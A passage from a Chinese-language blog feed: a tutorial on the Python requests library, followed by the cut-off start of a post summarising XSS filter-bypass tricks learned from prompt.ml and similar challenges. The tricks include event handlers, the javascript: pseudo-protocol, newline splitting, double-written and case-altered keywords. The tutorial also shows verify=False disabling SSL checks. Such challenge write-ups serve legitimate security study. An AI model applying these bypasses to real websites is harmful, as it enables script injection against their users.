<code>Requests</code> 库的威力：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"https://api.github.com/user"</span>, auth=(<span class="string">'user'</span>, <span class="string">'pass'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">"content-type"</span>] </span><br><span class="line"><span class="string">'application/json; charset=utf8'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding</span><br><span class="line"><span class="string">"utf-8"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">u'&#123;"type":"User"...'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</span><br><span class="line">&#123;<span class="string">u'private_gists'</span>: <span class="number">419</span>, <span class="string">u'total_private_repos'</span>: <span class="number">77</span>, ...&#125;</span><br></pre></td></tr></table></figure><h4 id="11-功能特性"><a class="markdownIt-Anchor" href="#11-功能特性"></a> <code>1.1 功能特性</code></h4><blockquote><ul><li>Keep-Alive &amp; 连接池</li><li>国际化域名和 URL</li><li>带持久 Cookie 的会话</li><li>浏览器式的 SSL 认证</li><li>自动内容解码</li><li>基本/摘要式的身份认证</li><li>优雅的 key/value Cookie</li><li>自动解压</li><li>Unicode 响应体</li><li>HTTP(S) 代理支持</li><li>文件分块上传</li><li>流下载</li><li>连接超时</li><li>分块请求</li><li>支持 <code>.netrc</code></li></ul></blockquote><h4 id="12-两个主要请求方法"><a class="markdownIt-Anchor" href="#12-两个主要请求方法"></a> <code>1.2 两个主要请求方法</code></h4><p><code>GET</code></p><blockquote><p>一般的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(URL)</span><br></pre></td></tr></table></figure><blockquote><p>带有参数的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: [<span class="string">'value2'</span>, <span class="string">'value3'</span>],<span class="string">"key3"</span>:<span class="string">"none"</span>&#125; //注意字典里值为 <span class="keyword">None</span> 的键都不会被添加到 URL 的查询字符串里。</span><br><span class="line">r = requests.get(URL, params=payload) // 第一种方式</span><br><span class="line"><span class="comment">##############################################################</span></span><br><span class="line">r = requests.get(URL, params=&#123;<span class="string">"key1"</span>:<span class="string">"value1"</span>,<span class="string">"key2"</span>:<span class="string">"value2"</span>&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>带有请求头其他参数的方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(URL, headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit'</span>&#125;)</span><br></pre></td></tr></table></figure><p><code>POST</code></p><blockquote><p>一般的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.post(URL)</span><br></pre></td></tr></table></figure><blockquote><p>带有参数的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">r = requests.post(<span class="string">"URL"</span>,data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)  <span class="comment"># 注意，如果POST请求需要传递json对象，需要使用json库的dumps()函数做一步转换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, json=payload)</span><br></pre></td></tr></table></figure><blockquote><p>带有请求头其他参数的方式同 <code>GET</code> 的方式一样</p></blockquote><h4 id="13-响应内容"><a class="markdownIt-Anchor" href="#13-响应内容"></a> <code>1.3 响应内容</code></h4><p><code>requests 响应的属性</code></p><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">信息</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">r.url</td><td style="text-align:center">HTTP 请求的网址</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.headers</td><td style="text-align:center">获得头部信息</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.text</td><td style="text-align:center">HTTP响应内容的字符串形式，即：url对应的页面内容</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.content</td><td style="text-align:center">HTTP响应内容的二进制形式</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.status_code</td><td style="text-align:center">HTTP请求的返回状态（状态码）</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.cookies</td><td style="text-align:center">网站的cookies</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.encoding</td><td style="text-align:center">从HTTP header中猜测的响应内容编码方式</td><td style="text-align:center">能够更改</td></tr><tr><td style="text-align:center">r.apparent_encoding</td><td style="text-align:center">从内容中分析出的响应内容编码方式（备选编码方式）</td><td style="text-align:center"></td></tr></tbody></table><blockquote><p>如果你改变了编码，每当你访问 <code>r.text</code> ，Request 都将会使用 <code>r.encoding</code> 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 <code>r.content</code> 来找到编码，然后设置 <code>r.encoding</code> 为相应的编码。这样就能使用正确的编码解析 <code>r.text</code> 了。</p><p>在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 <code>codecs</code> 模块进行注册，你就可以轻松地使用这个解码器名称作为 <code>r.encoding</code> 的值， 然后由 Requests 来为你处理编码。</p></blockquote><p><code>二进制响应内容</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.content</span><br><span class="line"><span class="string">b'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></span><br></pre></td></tr></table></figure><p>Requests 会自动为你解码 <code>gzip</code> 和 <code>deflate</code> 传输编码的响应数据，例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>i = Image.open(BytesIO(r.content))</span><br></pre></td></tr></table></figure><p><code>Json 响应内容</code></p><p>Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"https://api.github.com/events"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</span><br><span class="line">[&#123;<span class="string">u'repository'</span>: &#123;<span class="string">u'open_issues'</span>: <span class="number">0</span>, <span class="string">u'url'</span>: <span class="string">'https://github.com/...</span></span><br></pre></td></tr></table></figure><blockquote><p>如果 JSON 解码失败， <code>r.json()</code> 就会抛出一个异常。例如，响应内容是 401 (Unauthorized)，尝试访问 <code>r.json()</code> 将会抛出 <code>ValueError: No JSON object could be decoded</code> 异常。</p><p>需要注意的是，成功调用 <code>r.json()</code> 并<strong>不</strong>意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 <code>r.raise_for_status()</code> 或者检查 <code>r.status_code</code> 是否和你的期望相同。</p></blockquote><p><code>1.4 响应状态码</code></p><p>我们可以检测状态码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><p>为方便引用，Requests还附带了一个内置的状态码查询对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code == requests.codes.ok</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.raise_for_status" target="_blank" rel="noopener"><code>Response.raise_for_status()</code></a> 来抛出异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.status_code</span><br><span class="line"><span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.raise_for_status()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"requests/models.py"</span>, line <span class="number">832</span>, <span class="keyword">in</span> raise_for_status</span><br><span class="line">    <span class="keyword">raise</span> http_error</span><br><span class="line">requests.exceptions.HTTPError: <span class="number">404</span> Client Error</span><br></pre></td></tr></table></figure><h4 id="14-cookie"><a class="markdownIt-Anchor" href="#14-cookie"></a> <code>1.4 Cookie</code></h4><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure><p>要想发送你的cookies到服务器，可以使用 <code>cookies</code> 参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="15-重定向与请求历史"><a class="markdownIt-Anchor" href="#15-重定向与请求历史"></a> <code>1.5 重定向与请求历史</code></h4><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><h4 id="16-超时"><a class="markdownIt-Anchor" href="#16-超时"></a> <code>1.6 超时</code></h4><p>可以告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注意：<code>timeout</code> 仅对连接过程有效，与响应体的下载无关。 <code>timeout</code> 并不是整个下载响应的时间限制，而是如果服务器在 <code>timeout</code> 秒内没有应答，将会引发一个异常（更精确地说，是在 <code>timeout</code> 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</p></blockquote><h3 id="2-requests-库的高级用法"><a class="markdownIt-Anchor" href="#2-requests-库的高级用法"></a> <code>2 requests 库的高级用法</code></h3><h4 id="21-会话对象session"><a class="markdownIt-Anchor" href="#21-会话对象session"></a> <code>2.1 会话对象Session</code></h4><p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie， 期间使用 <code>urllib3</code> 的 <a href="http://urllib3.readthedocs.io/en/latest/reference/index.html#module-urllib3.connectionpool" target="_blank" rel="noopener">connection pooling</a> 功能。所以如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。 (参见 <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection" target="_blank" rel="noopener">HTTP persistent connection</a>).</p><p>会话对象具有主要的 Requests API 的所有方法。我们来跨请求保持一些 cookie:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.get(<span class="string">'http://httpbin.org/cookies/set/sessioncookie/123456789'</span>)</span><br><span class="line">r = s.get(<span class="string">"http://httpbin.org/cookies"</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"><span class="comment"># '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="22-请求与响应对象"><a class="markdownIt-Anchor" href="#22-请求与响应对象"></a> <code>2.2 请求与响应对象</code></h4><p>任何时候进行了类似 requests.get() 的调用，你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 <code>requests</code> 得到一个从服务器返回的响应就会产生一个 <code>Response</code> 对象。该响应对象包含服务器返回的所有信息，也包含你原来创建的 <code>Request</code> 对象。如下是一个简单的请求，从 Wikipedia 的服务器得到一些非常重要的信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://en.wikipedia.org/wiki/Monty_Python'</span>)</span><br></pre></td></tr></table></figure><p>如果想访问服务器返回给我们的响应头部信息，可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</span><br><span class="line">&#123;<span class="string">'content-length'</span>: <span class="string">'56170'</span>, <span class="string">'x-content-type-options'</span>: <span class="string">'nosniff'</span>, <span class="string">'x-cache'</span>:</span><br><span class="line"><span class="string">'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet'</span>, <span class="string">'content-encoding'</span>:</span><br><span class="line"><span class="string">'gzip'</span>, <span class="string">'age'</span>: <span class="string">'3080'</span>, <span class="string">'content-language'</span>: <span class="string">'en'</span>, <span class="string">'vary'</span>: <span class="string">'Accept-Encoding,Cookie'</span>,</span><br><span class="line"><span class="string">'server'</span>: <span class="string">'Apache'</span>, <span class="string">'last-modified'</span>: <span class="string">'Wed, 13 Jun 2012 01:33:50 GMT'</span>,</span><br><span class="line"><span class="string">'connection'</span>: <span class="string">'close'</span>, <span class="string">'cache-control'</span>: <span class="string">'private, s-maxage=0, max-age=0,</span></span><br><span class="line"><span class="string">must-revalidate'</span>, <span class="string">'date'</span>: <span class="string">'Thu, 14 Jun 2012 12:59:39 GMT'</span>, <span class="string">'content-type'</span>:</span><br><span class="line"><span class="string">'text/html; charset=UTF-8'</span>, <span class="string">'x-cache-lookup'</span>: <span class="string">'HIT from cp1006.eqiad.wmnet:3128,</span></span><br><span class="line"><span class="string">MISS from cp1010.eqiad.wmnet:80'</span>&#125;</span><br></pre></td></tr></table></figure><p>然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.request.headers</span><br><span class="line">&#123;<span class="string">'Accept-Encoding'</span>: <span class="string">'identity, deflate, compress, gzip'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/0.13.1'</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="23-准备的请求-prepared-request"><a class="markdownIt-Anchor" href="#23-准备的请求-prepared-request"></a> <code>2.3 准备的请求 （Prepared Request）</code></h4><p>目前忽略</p><h4 id="24-ssl-证书验证"><a class="markdownIt-Anchor" href="#24-ssl-证书验证"></a> <code>2.4 SSL 证书验证</code></h4><p>Requests 可以为 HTTPS 请求验证 SSL 证书，就像 web 浏览器一样。SSL 验证默认是开启的，如果证书验证失败，Requests 会抛出 SSLError:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://requestb.in'</span>)</span><br><span class="line">requests.exceptions.SSLError: hostname <span class="string">'requestb.in'</span> doesn<span class="string">'t match either of '</span>*.herokuapp.com<span class="string">', '</span>herokuapp.com<span class="string">'</span></span><br></pre></td></tr></table></figure><p>在该域名上我没有设置 SSL，所以失败了。但 Github 设置了 SSL:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="keyword">True</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><p>你可以为 <code>verify</code> 传入 CA_BUNDLE 文件的路径，或者包含可信任 CA 证书文件的文件夹路径：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="string">'/path/to/certfile'</span>)</span><br></pre></td></tr></table></figure><p>或者将其保持在会话中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.verify = <span class="string">'/path/to/certfile'</span></span><br></pre></td></tr></table></figure><blockquote><p>注解：如果 <code>verify</code> 设为文件夹路径，文件夹必须通过 OpenSSL 提供的 c_rehash 工具处理</p></blockquote><p>你还可以通过 <code>REQUESTS_CA_BUNDLE</code> 环境变量定义可信任 CA 列表。</p><p>如果你将 <code>verify</code> 设置为 False，Requests 也能忽略对 SSL 证书的验证。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.org'</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><p># 对于私有证书，你也可以传递一个 CA_BUNDLE 文件的路径给 <code>verify</code>。你也可以设置 # <code>REQUEST_CA_BUNDLE</code> 环境变量。</p><blockquote><p>其他相关requests内容请见<a href="https://requests.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">Requests库中文官方文档</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;首先来看一下基本第三方库有什么？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;库名&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="python" scheme="https://muzibing.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>xss_payload_构造总结及深度剖析(持续更新中……)</title>
    <link href="https://muzibing.github.io/2020/03/09/2020.03.08%EF%BC%88100%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/09/2020.03.08（100）/</id>
    <published>2020-03-08T16:00:00.000Z</published>
    <updated>2020-03-14T14:26:54.173Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、绕过-XSS-Filter-的方法"><a href="#一、绕过-XSS-Filter-的方法" class="headerlink" title="一、绕过 XSS Filter 的方法"></a>一、绕过 XSS Filter 的方法</h3><h4 id="1-逃离-quot-quot-的束缚"><a href="#1-逃离-quot-quot-的束缚" class="headerlink" title="1.逃离 &quot;&quot; 的束缚"></a>1.逃离 <code>&quot;&quot;</code> 的束缚</h4><p>※ <code>普通的闭合</code></p><blockquote><p>有的并没有进行过滤，只需要简单的闭合即可逃离；</p></blockquote><p>※ <code>利用反引号代替</code></p><blockquote><p>条件：过滤掉 “”。在 <code>IE</code> 浏览器下，用 `` 代替 \” \”，以到达闭合的作用；</p></blockquote><p>※ <code>利用换行的特性</code></p><blockquote><p>详情见 <code>prompt.ml</code> 0x08 题目</p></blockquote><h4 id="2-lt-和-gt-过滤类型的题目"><a href="#2-lt-和-gt-过滤类型的题目" class="headerlink" title="2.&lt; 和 /&gt; 过滤类型的题目"></a>2.<code>&lt;</code> 和 <code>/&gt;</code> 过滤类型的题目</h4><p>※ <code>利用事件触发 payload</code></p><blockquote><p>虽然不能产生新的标签，但是可以在已经存在的标签（如svg、input、img、script等）内部添加 <code>on+event</code> 事件（onclick、onerror、onload、onmouseup、onmousedown等）</p><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x06-input-%E6%A0%87%E7%AD%BE%E5%86%85%E9%83%A8-js-%E4%BA%8B%E4%BB%B6font](https://muzibing.github.io/2020/03/08/2020.03.08（99）/#font-color-navy0x06-input-标签内部-js-事件font">xss challenges_0x06</a>)、</p></blockquote><p>※ <code>利用题目中给出的函数进行绕过</code></p><blockquote><p>可以根据代码中相关函数的特性进行绕过；</p><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/#font-color-navy0x01-%E6%A0%87%E7%AD%BE%E9%97%AD%E5%90%88font](https://muzibing.github.io/2020/02/27/2020.02.27（96）/#font-color-navy0x01-标签闭合font">prompt.ml_0x01</a>)</p></blockquote><h4 id="3-on-event-的过滤"><a href="#3-on-event-的过滤" class="headerlink" title="3.on+event 的过滤"></a>3.<code>on+event</code> 的过滤</h4><p>※ <code>通过伪协议来完成payload</code></p><blockquote><p>虽然不能通过 <code>on+event</code> 来完成 js 事件的出发，但是可以通过伪协议 <code>javascript:</code> 来构造。</p><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont](https://muzibing.github.io/2020/03/08/2020.03.08（99）/#font-color-navy0x0b-伪协议font">XSS challenges</a>)</p></blockquote><h4 id="4-on-event-的过滤"><a href="#4-on-event-的过滤" class="headerlink" title="4.on+event = 的过滤"></a>4.<code>on+event =</code> 的过滤</h4><p>※ <code>通过换行进行绕过</code></p><blockquote><p>可以利用 js 事件与<code>=</code>不在同一行上，也能被成功解析的特性来绕过，举个例子：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a</span><br><span class="line">= <span class="string">'hello xss'</span>;</span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure><blockquote><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/02/27/2020.02.27%EF%BC%8896%EF%BC%89/#font-color-navy0x05-%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%8F%8A%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87font](https://muzibing.github.io/2020/02/27/2020.02.27（96）/#font-color-navy0x05-属性覆盖及换行绕过font">prompt.ml_0x05</a>)</p></blockquote><h4 id="5-对标识符-关键词-字符串进行过滤或者替换"><a href="#5-对标识符-关键词-字符串进行过滤或者替换" class="headerlink" title="5.对标识符/关键词/字符串进行过滤或者替换"></a>5.对标识符/关键词/字符串进行过滤或者替换</h4><p>※ <code>利用过滤规则进行绕过</code></p><blockquote><p>要利用好题目中给出的规则，来达到绕过的目的，一般是删除某些标识符：<code>svg</code>、 <code>script</code> 、<code>alert</code>等，我们可以利用双写的形式进行绕过：<code>svsvgg</code>、<code>scriscriptpt</code>、<code>alealertrt</code>的形式达到绕过的目的。</p><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0a-%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87font](https://muzibing.github.io/2020/03/08/2020.03.08（99）/#font-color-navy0x0a-字符编码绕过font">xss challenges_0x0A</a>)</p></blockquote><p>※ <code>利用 script 的大小写不敏感的特性</code></p><blockquote><p>有些题目会对 script 进行过滤（前提是区分大小写），这时我们可以利用 <code>script</code> 标签大小写不敏感的特性来绕过，如将<code>script</code>变为<code>xscript</code>，我们可以输入<code>SCRipt</code>。</p><p><code>相关题目</code>：暂无</p></blockquote><p>※ 